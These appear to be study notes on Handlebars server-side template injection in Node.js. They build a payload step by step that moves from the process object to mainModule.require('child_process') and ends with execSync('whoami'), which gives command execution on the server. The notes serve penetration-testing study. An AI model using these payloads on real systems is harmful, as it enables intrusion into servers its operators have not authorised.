

### **Global Variables in Node.js**

- **Globals** in computer programming are variables that are globally accessible throughout a program.
    
- In **Node.js**, Global objects are available in all loaded modules.
    

#### **Key Points:**

- A quick Google search for "Node.js Global Scope" provides documentation listing all available Global Objects in Node.js.
    
- **Important Variables** that appear to be global but are actually built-in objects in Node.js:
    
    - `__dirname`
        
    - `__filename`
        
    - `exports`
        
    - `module`
        
    - `require()`
        
- **Key Takeaway**: `require` is **not** globally accessible in certain contexts and may not be available in specific cases.
    

---

### **Process Object in Node.js**

- **Process Object** provides information and control over the current Node.js process.
    
- **Objective**: To use this object to load a module.
    

#### **Example Payload:**

- Modify the payload to return the **`process`** object:
    

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process;"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

- URL encode the payload and send via **BurpSuite Repeater**.
    
- **Response**: `process` object is available, confirmed by the response showing `[object process]`.
    

---

### **Exploring `mainModule` Property**

- The **`mainModule`** property is deprecated since Node.js version 14.0.0, but it might still be accessible.
    
- The **`mainModule`** property contains a reference to the main module.
    

#### **Next Steps:**

- Modify payload to return **`process.mainModule`**:
    

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule;"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

- **Response**: `[object Object]` is returned, confirming that **`mainModule`** is accessible.
    

---

### **Attempting to Load the `child_process` Module**

- The `child_process` module is available on default Node.js installations and can execute system commands.
    

#### **Updated Payload**:

- Modify payload to load **`child_process`** module using **`mainModule`**:
    

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

- **Response**: The **`child_process`** module has been loaded successfully.
    

---

### **Executing a System Command (e.g., `whoami`)**

- Now, attempt to execute a system command like **`whoami`** using **`execSync()`** from the `child_process` module.
    

#### **Final Payload**:

- Modify payload to run **`whoami`**:
    

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

- **Response**: The **`child_process.execSync()`** function successfully executes, confirming that system commands can be run via the **`child_process`** module.
    

---

### **Summary of Key Takeaways**:

1. **Globals in Node.js** are available in all modules, but **`require()`** may not be globally accessible.
    
2. The **`process`** object can provide useful system information and control.
    
3. The **`mainModule`** property, though deprecated, can still be accessed to load the **`require`** function in sandboxed environments.
    
4. The **`child_process`** module can be used to execute system commands like **`whoami`** after it is successfully loaded.
    
